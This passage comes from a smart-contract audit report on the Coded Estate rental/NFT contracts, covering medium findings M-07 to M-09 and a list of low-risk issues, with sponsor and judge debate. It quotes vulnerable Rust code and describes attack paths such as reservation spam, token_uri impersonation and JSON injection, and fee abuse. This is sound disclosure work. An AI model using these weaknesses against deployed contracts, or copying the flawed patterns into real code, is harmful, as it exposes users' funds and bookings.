Definitely a good point to raise, on the fence about the severity here. One could argue that this is by design for such platforms, as there are many other web2 sites where you can make reservations for free and therefore block a valid user. On the other hand, because this is a smart contract where you can easily submit transactions from multiple addresses, doing this becomes very easy and hard to prevent after an initial deployment. A malicious user could easily perform a lot of reservations to block properties all the time, which would impact the intended function of the protocol and its availability. This matches the definition of a valid Medium.

**blockchainstar12 (Coded Estate) acknowledged and commented:**

We have manual reject logic at this contract, so request without deposit won’t be confirmed to owners.


## [M-07] Reservations can be made outside of rental property’s available_period


*Submitted by adeolu*

There is no check for if the `renting_period` is within the rentals available period (`token.shortterm_rental.available_period`). This means that reservations can be made to rent the property on dates outside its available period.


### Proof Of Concept


Property managers/landlords can list a property via `setlistforshorttermrental()` and `setlistforshorttermrental()`. In both of these functions, the parameter `available_period` is accepted and is set into the rental token’s struct in storage as seen below:

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L722-L742](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L722-L742)

```

    pub fn setlistforshorttermrental(
        .....

        available_period: Vec<String>,

        ....
    ) -> Result<Response<C>, ContractError> {
        ......
        token.shortterm_rental.available_period = available_period;
        ....
    }

```

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1280-L1300](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1280-L1300)

```

    pub fn setlistforlongtermrental(
        .....

        available_period: Vec<String>,

        ....
    ) -> Result<Response<C>, ContractError> {
        ......
        token.longterm_rental.available_period = available_period;
        ....
    }

```

In these functions, the rental’s available time is specified by the property manager/owner and this is set into storage. But users can still make reservations for the property for times outside the rental’s available period. This is because `setreservationforshortterm()` and `setreservationforlongterm()` do not check that the `renting_period` specified by a renting user is within the rental property’s `available_period`. As seen below in both functions, they only check that the `renting_period` is more than the rental’s minimum stay duration, i.e., more than 1 day if minimum duration is 1 day. A real world scenario example of this bug is that a user can make still reservations for July 21-25th even though the property owner/manager has specified that the rental’s available period is only June 21-25th.

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L795-L817](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L795-L817)

```

        let new_checkout = renting_period[1].parse::<u64>();
        let new_checkout_timestamp;

        match new_checkout {
            Ok(timestamp) => {
                new_checkout_timestamp = timestamp;
            }
            Err(_e) => {
                return Err(ContractError::NotReserved {});
            }
        }

        if ((new_checkout_timestamp - new_checkin_timestamp)/ 86400) < token.shortterm_rental.minimum_stay {
            return Err(ContractError::LessThanMinimum {});
        }

```

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1353-L1374](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1353-L1374)

```

        let new_checkout = renting_period[1].parse::<u64>();
        let new_checkout_timestamp;

        match new_checkout {
            Ok(timestamp) => {
                new_checkout_timestamp = timestamp;
            }
            Err(_e) => {
                return Err(ContractError::NotReserved {});
            }
        }

        if ((new_checkout_timestamp - new_checkin_timestamp)/ 86400) < token.longterm_rental.minimum_stay {
            return Err(ContractError::LessThanMinimum {});
        }

```

### Recommended Mitigation


Check that the `renting_period` specified by renting users is within the property’s `available_period.`


### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged and commented:**

It’s not necessary logic as owners can reject any request, available period is optional. 

**adeolu (warden) commented:**

It’s not necessary logic as owners can reject any request, available period is optional. 

But owners can set an `available_period` time, with the idea that they expect renters to make reservations for that period only. Just because it’s optional doesn’t mean that when the feature is to be used it should not work as expected.


## [M-08] Can impersonate another high value rental because token_uri is arbitrary and supplied by user


*Submitted by adeolu*

Because `token_uri` value is not sanitized and is arbitrary/provided by a user, a malicious user can provide a token uri which may have `"` or `,` or simply a fake url which points to a different higher value rental property in order to phish unsuspecting users.


### Proof Of Concept

```

    pub fn mint(
        &self,
        deps: DepsMut,
        info: MessageInfo,
        token_id: String,
        owner: String,
        token_uri: Option<String>,
        extension: T,
    ) -> Result<Response<C>, ContractError> {
        //@audit no money collected to mint a token? do they mint for free? 
        // cw_ownable::assert_owner(deps.storage, &info.sender)?;

        let longterm_rental = LongTermRental {
            islisted: None,
            price_per_month: 0u64,
            available_period:vec![],
            deposit_amount: Uint128::from(0u64),
            withdrawn_amount: Uint128::from(0u64),
            denom:"ibc/F082B65C88E4B6D5EF1DB243CDA1D331D002759E938A0F5CD3FFDC5D53B3E349".to_string(),
            auto_approve:false,
            cancellation:vec![],
            minimum_stay:0u64,
        };

        let shortterm_rental = ShortTermRental {
            islisted: None,
            price_per_day: 0u64,
            available_period: vec![],
            deposit_amount: Uint128::from(0u64),
            withdrawn_amount: Uint128::from(0u64),
            denom: "ibc/F082B65C88E4B6D5EF1DB243CDA1D331D002759E938A0F5CD3FFDC5D53B3E349".to_string(),
            auto_approve: false,
            cancellation:vec![],
            minimum_stay:0u64,
        };

        let sell = Sell {
            islisted:None,
            auto_approve:false,
            price:0u64,
            denom:"ibc/F082B65C88E4B6D5EF1DB243CDA1D331D002759E938A0F5CD3FFDC5D53B3E349".to_string(),            
        };

        // create the token
        let token = TokenInfo {
            owner: info.sender.clone(),
            approvals: vec![],
            rentals:vec![],
            bids:vec![],
            longterm_rental,
            shortterm_rental,
            sell,
            token_uri, 
            extension,
        };

        self.tokens
            .update(deps.storage, &token_id, |old| match old {
                Some(_) => Err(ContractError::Claimed {}),
                None => Ok(token),
            })?;

        self.increment_tokens(deps.storage)?;

        Ok(Response::new()
            .add_attribute("action", "mint")
            .add_attribute("minter", info.sender)
            .add_attribute("owner", owner) //@audit here owner arg is used but in the token object owner is set to info.sender. owner may not be info.sender
            .add_attribute("token_id", token_id))
    }

```

Let’s say a malicious user wants to make a rental that impersonates another high value rental, the attacker can set his own token’s uri to be an exact copy of the high value rental and display attributes/json metadata which is the same. Unsuspecting users might then be tricked into renting from the wrong landlord or buying the wrong rental, because the frontend will display same rental property image and same attributes. All this is possible because `token_uri` is arbitrary.

To prevent your project from becoming a hotbed for phishing, the `token_uri` should not be arbitrary, it can be generated by the code. There are a few similar implementations like this [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/Descriptor.sol#L97-L112). The token uri is constructed into a json string and its then modified into a `base64` json.


### Recommended Mitigation


Don’t make token uri arbitrary, generate it in code. Ensure your generation logic rejects strings that contain `"` and `,` as these can also be exploited by attackers to do json injection of false fields.


### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged**

**Lambda (judge) commented:**

Requires some assumptions about the off-chain usage, but similar issues have historically been judged as Medium, as seen [here](https://github.com/code-423n4/2023-03-canto-identity-findings/issues/212) and [here](https://github.com/code-423n4/2022-02-skale-findings/issues/26) and there is a valid attack pattern.

**nnez (warden) commented:**

@Lambda - I disagree with the Medium severity of this issue. It should be classified as a QA-level finding at most.

There are 2 claimed impacts here:  

1. Impersonation of another high-value property (rental).
2. JSON injection.

Let’s explore the validity of these claims.  


### Impersonation


To generalize the problem, NFTs are typically distinguished by several identifiers such as `tokenId`, `tokenURI`, and specific token attributes. For example, a token with `tokenId=1` and `tokenURI=A` is a different asset from one with `tokenId=2` and `tokenURI=B`.

In this particular protocol, the key identifiers of the tokens (representing properties) are:

- **TokenID**: Each token’s `tokenId` is unique and user-specified, ensuring that no two tokens can have the same `tokenId`.  
- **TokenURI**: This field is arbitrary, meaning that its content (whether in JSON format, URL, or any other structure) does not follow a strict convention. However, the format or content of the `tokenURI` is irrelevant to the impersonation risk, as it merely serves as metadata.  

In traditional NFT protocols, `tokenURI` plays a significant role in defining a token’s value, as it may contain important unique metadata. If an attacker could replicate the `tokenURI`, it might be possible to create a token that looks identical and that eliminates the value of the unique NFT. However, in this protocol, the value is instead linked to the **real-world property** and, therefore, to the **ownership** of that property.  

**Real-World Analogy:** Consider a rental platform like Airbnb. If two properties look identical, a user will check the legitimacy of the **owner** to verify the booking. Similarly, in this protocol, the core identifier is the property’s owner, not just the `tokenURI`. The protocol must ensure that the owner’s identity, along with other token identifiers, is clearly presented on the front-end to avoid confusion.  

Thus, while the `tokenURI` is arbitrary, impersonation in this protocol relies primarily on the ownership of the property, making it a front-end issue, not a smart contract level concern.  

To simply put it, one should distinguish each token using not just one of its identifiers but all of its identifiers.  


### JSON Injection


Regarding JSON injection, the concern here appears to stem from the assumption that `tokenURI` might be used in a structured format such as JSON. However, this is speculative. The `tokenURI` field is arbitrary, and without explicit evidence, like in the cited findings, we can’t assume that it’s gonna be constructed at a smart contract level in JSON format.  

Besides, the risk of impersonation related to the `tokenURI`, regardless of format, was already addressed in the previous section.  


### Conclusion


In conclusion, while the claim regarding the arbitrary `tokenURI` is valid, the claimed impact is not. This issue should be regarded as a front-end concern rather than a smart contract vulnerability, as there is no effective mitigation at the smart contract level to address it directly.  

That is, the front-end should:  

- Must ensure that the owner’s identity, along with other token identifiers, is clearly presented on the front-end to avoid confusion.  
- Must sanitize and validate the input from `tokenURI` (I don’t think you can do that effectively on the smart contract level, given the computational limit by nature of transaction execution on blockchain).  

Although there is precedent for classifying similar issues as Medium severity, I believe it is more appropriate to tailor the severity to the specific context of this protocol, rather than generalizing the issue based on previous cases.  

**adeolu (warden) commented:**

This issue should be regarded as a front-end concern rather than a smart contract vulnerability, as there is no effective mitigation at the smart contract level to address it directly.

@nnez - But there is a good mitigation for this, which is preventing arbitrary strings to be used as token URI. And I put a snippet of a better token Uri generation implementation in my original submission. high value  protocols that use nft; i.e., uniswap never allows arbitrary uri generation.

Also, how is it a front end concern and not a contract vuln if the issue stems from a misuse of the smart contract?  this protocol is very well dependent on the token Uri for their use case As token Uri contains all attributes and possibly images of the rental. 

**nnez (warden) commented:**

Say the protocol were to implement the construct function as you suggested:

```

    function constructTokenURI(TokenURIParams memory params) public pure returns (string memory) {
        string memory json = string(
            abi.encodePacked(
                '{"name":"',
                params.name,
                '", "description":"',
                params.description,
                '", "image": "',
                params.image,
                '", "animation_url": "',
                params.animation_url,
                '"}'
            )
        );
        return string(abi.encodePacked("data:application/json;base64,", Base64.encode(bytes(json))));
    }

```

Here, the name, the description, the image and other metadata on the token is still an arbitrary params. How would you effectively prevent a malicious actor from using the same name, same description, and the same image of the legitimate rental property?  

Even if you hash all the inputs and prevent the same inputs from being used twice, a malicious actor can just change the url, add another character or words to the name and description.  

My whole point here is that one cannot rely solely on `tokenURI` for uniqueness of the token. One will know for sure that they’re making a reservation on a legitimate token (property) if one knows all three information: `owner`, `tokenId` and `tokenURI`. One can never know for sure if they only know one of the three.  

`owner` and `tokenId` are both unique and cannot be forged.  

- You must have a private key of the `owner` to impersonate as `owner`
- The logic of the contract prevents the token with same `tokenId` from being created

So, it does make sense to allow an arbitrary information in `tokenURI` so that token owner can put their property’s information there. How other protocols uses their tokenURI is irrelevant here as I have pointed out that the context for this protocol is different.  

It is the front-end responsbility to display all required information (`owner`, `tokenId` and `tokenURI`) to users to enable them to distinguish between genuine and fake properties.  

**Lambda (judge) commented:**

@nnez - I agree with the points raised about impersonation. You cannot solely rely on these attributes, which is a problem that all NFTs face to a certain point (there is for instance nothing stopping anyone from creating a fake BAYC contract that points to the same image) and is very hard to solve (especially without introducing some centralized instance that would e.g., verify the attributes).

For the second point:

Regarding JSON injection, the concern here appears to stem from the assumption that tokenURI might be used in a structured format such as JSON. However, this is speculative. 

This is indeed somewhat speculative (it relies on external requirements, which is generally fine for a Medium), but seems like a reasonable assumption. The ERC721 standard even requires this with its metadata assumption. The implementation is based on CW721 with similar requirements/recommendations (see [here](https://github.com/public-awesome/cw-nfts/blob/main/packages/cw721/README.md)). Of course, it is also not clear what external systems are doing with this information. But a reasonable assumption here is that it is parsed and/or downloaded and displayed in a frontend. 

These things are valid concerns and have happened in the past (see [here](https://0xhagen.medium.com/how-opensea-allows-cross-site-scripting-attacks-xss-bc28265ebdf7) or [here](https://zokyo.io/blog/under-the-hacker-s-hood-json-injection-in-nft-metadata/), for e.g.). Of course, they should also be addressed in a frontend by taking respective measures. But I see the valid attack path with external requirements here (although I would have liked a few more details in the issue description).

**nnez (warden) commented:**

Of course, it is also not clear what external systems are doing with this information. But a reasonable assumption here is that it is parsed and or downloaded and displayed in a frontend.

Isn’t this an indication that the issue resides on the front-end side?  

I believe the criteria for external requirement is the other way around where it requires a specific situation for the bug to occur on **smart contract** not that it would happen on the external system.  

The issue would be valid if the `tokenURI` were intended to be immutable like traditional NFTs. However, in this case, it’s designed to allow arbitrary information because users need to input their rental information.  

Would your perspective on the issue change if the field name were changed to `description` and allowed arbitrary string? Would it be the front-end’s responsibility to filter and sanitize the string data retrieved before using it?  

**Lambda (judge) commented:**

It is definitely debatable whose responsibility it is and I’d recommend everyone writing a frontend to sanitize any `tokenURI` return value before using it in the frontend. Nevertheless, this is unfortunately not always done (see above, this was even a major NFT platform) and in such cases, users might actually blame you/your contract because your contracts ultimately caused the malicious payload. 

Would your perspective on the issue change if the field name were changed to description and allowed arbitrary string?

Depends, if the string were sanitized, definitely. Otherwise I’d still see the valid attack path.


## [M-09] User supplied owner address which is meant to be token owner is never the token owner


*Submitted by adeolu*

In the function `mint()`, owner is a parameter which is accepted by the function and is meant to be set into the `TokenInfo` struct’s owner field during the mint. But the issue is that the `TokenInfo` struct sets the `owner` to be the `info.sender`. This is wrong because `info.sender`, which is the function caller is not always the `owner` arg. This means the mint logic is defective, the user supplied value for owner will never be the owner of the newly minted token.


### Proof Of Concept


[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L249-L257](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L249-L257)

```

    pub fn mint(
        &self,
        deps: DepsMut,
        info: MessageInfo,
        token_id: String,
        owner: String,
        token_uri: Option<String>,
        extension: T,
    ) -> Result<Response<C>, ContractError> {

```

From above, we can see the mint function’s name and parameters, the owner parameter is a required parameter meant to be provided by the caller of the function. But this `owner` parameter is not used in the `token:TokenInfo struct`. Instead, `owner` is set to be the function caller instead of the user supplied owner value.

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L293](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L293)

```

        let token = TokenInfo {
            owner: info.sender.clone(), //@audit owner is provided as arg, function caller is set as owner instead. 
            approvals: vec![],
            rentals:vec![],
            bids:vec![],
            longterm_rental,
            shortterm_rental,
            sell,
            token_uri,
            extension,
        };

```

This will mean that a case where user A wants to mint `token1` for user B will not work because even though user A is the function caller and has specified that user B should be the owner of `token1`, user A will still be set as the token owner.


### Recommended Mitigation


Set user supplied owner value as owner in the token struct.

```

        let token = TokenInfo {
            owner: owner,
            approvals: vec![],
            rentals:vec![],
            bids:vec![],
            longterm_rental,
            shortterm_rental,
            sell,
            token_uri, 
            extension,
        };

```

### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged and commented:**

It does not make any issues actually.

**adeolu (warden) commented:**

It does not make any issues actually.

The function accepts user specified Param address to be owner; the function doesn’t set the user specified param address as owner in token struct and then returns [a response](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L314) that it has set owner to be the user specified “owner” param value. The owner param value is not always same as `info.sender`.


# Low Risk and Non-Critical Issues


For this audit, 3 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/30) by **Ch_301** received the top score from the judge.

*The following wardens also submitted reports: nnez and K42.*


## [01] The current logic can’t handle CW20 tokens


Travelers can’t make reservations with CW20 (but the readME says: **ERC20 used by the protocol	Any (all possible ERC20s))**.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/README.md#general-questions](https://github.com/code-423n4/2024-10-coded-estate/blob/main/README.md#general-questions)


## [02] Malicious owners can set the fee to 100%


Malicious owners can set the fee to 100% by triggering `execute.rs#set_fee_value()`, this will leave homeowners with zero revenue. 

[https://github.com/code-423n4/2024-10-coded-estate/tree/main/contracts/codedestate/src#L318-L323](https://github.com/code-423n4/2024-10-coded-estate/tree/main/contracts/codedestate/src#L318-L323)


## [03] auto_approve is not used in long-term rent


The `execute.rs#setlistforlongtermrental()` function lets NFT owner set the `auto_approve`, but it is not used in the logic of long-term rent.

[https://github.com/code-423n4/2024-10-coded-estate/tree/main/contracts/codedestate/src#L1288](https://github.com/code-423n4/2024-10-coded-estate/tree/main/contracts/codedestate/src#L1288)


## [04] minter is not used in this contract delete it


The struct `InstantiateMsg` has a `pub minter: String,`. This minter is no longer used in this cw721 contract. Also all the `query.rs#minter()`.

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/query.rs#L418-L424](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/query.rs#L418-L424)


## [05] Use to_json_binary and from_json_binary


`to_binary` and `from_binary` are deprecated so replace with: `to_json_binary` and `from_json_binary`. Check [this](https://github.com/public-awesome/cw-nfts/issues/141) for more details.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/packages/cw721/src/receiver.rs#L26](https://github.com/code-423n4/2024-10-coded-estate/blob/main/packages/cw721/src/receiver.rs#L26)


## [06] cosmwasm-std 1.4.0v is vulnerable


Using a vulnerable version of `cosmwasm-std`. Check [here](https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-002.md) for more details.

```

File: Cargo.lock

157: [[package]]
158: name = "cosmwasm-std"
159: version = "1.4.0"

```

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/Cargo.lock#L158-L159](https://github.com/code-423n4/2024-10-coded-estate/blob/main/Cargo.lock#L158-L159)


## [07] The first buyer could get front-runed after autoApprove get updated


If NFT is not `autoApprove`, in case the user calls the `execute.rs#setbidtobuy()` function then the owner updates the `autoApprove to true`. Any other user could call the `execute.rs#setbidtobuy()` function and buy it (transfer it). The first user wants to be able to buy it even if he pays first. It should be transferred to the first bid.


## [08] available_period is not used


The NFT owner is able to set the `available_period: Vec<String>` but it never gets checked in this contract.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1300](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1300)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L742](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L742)


## [09] The logic doesn’t return the excited funds to the users


When the user calls `execute.rs#setreservationforshortterm()` to send more funds than `price + fee`, he will not receive it back. It will go to the protocol.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L866](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L866) 


## [10] Risk of out-of-gas


In `execute.rs`, multiple iterations occur over the `token.rentals` vector, which may cause the transaction to fail due to an out-of-gas error, specifically in `setreservationforshortterm()` and `setapproveforshortterm()`. Consequently, malicious users could exploit this by opening many reservations to force `setapproveforshortterm()` to fail due to gas limits.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L823](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L823)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L940](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L940)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1822](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1822)


## [11] Risk of 100% cancellation penalty for users


Malicious NFT owners could percentage of cancellations to 100% in short-term reservations. 

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L746](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L746)


## [12] check_can_edit_long() and check_can_edit_short() have the same logic


The NFT owner can’t un-list the LongRent only or `ShortRent`. So, in case I have only one going `ShortRent` and I want to unlist my NFT from the `LongRent`; it is not possible because both `check_can_edit_long()` and `check_can_edit_short()` have the same logic,
you need to check the `rental_type`, not just the last one in `rentals: vec<Rantal>`.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1953-L1972](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1953-L1972)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1974-L1992](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1974-L1992)


## [13] DoS attack


In the long-term malicious addresses can keep reserving one big period or multiple small ones. By triggering `execute.rs#setreservationforlongterm()`, the attacker will only lose the gas fee
because the logic doesn’t for users to deposit funds first in order to reserve for long-term rent.

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1341-L1432](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1341-L1432)


## [14] Use a daily or monthly basis


This checks the minimum stay for long-term rent in `execute.rs#setreservationforlongterm()`:

```

        if ((new_checkout_timestamp - new_checkin_timestamp)/ 86400) < token.longterm_rental.minimum_stay {
            return Err(ContractError::LessThanMinimum {});
        }

```

We can assume the `token.longterm_rental.minimum_stay` is a daily basis. But on the other side, we have `price_per_month` which is a monthly basis; this could confuse NFT owners.   

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1373](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1373)


## [15] The function execute.rs#depositforlongtermrental() doesn’t check if the deposit amount is enough for the reserved period


In the long-term rental functions, the user will call `execute.rs#setreservationforlongterm()` to reserve the period first. He needs to trigger `execute.rs#depositforlongtermrental()` to deposit the necessary amount. NFT owner will call `setapproveforlongterm()` but it doesn’t check whether the rental has deposited the required funds or not.

This is not a big problem because the NFT owner still able to reject or approve the reservation.   

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1544-L1590](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1544-L1590)

**blockchainstar12 (Coded Estate) confirmed**


# Disclosures


C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and rust developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.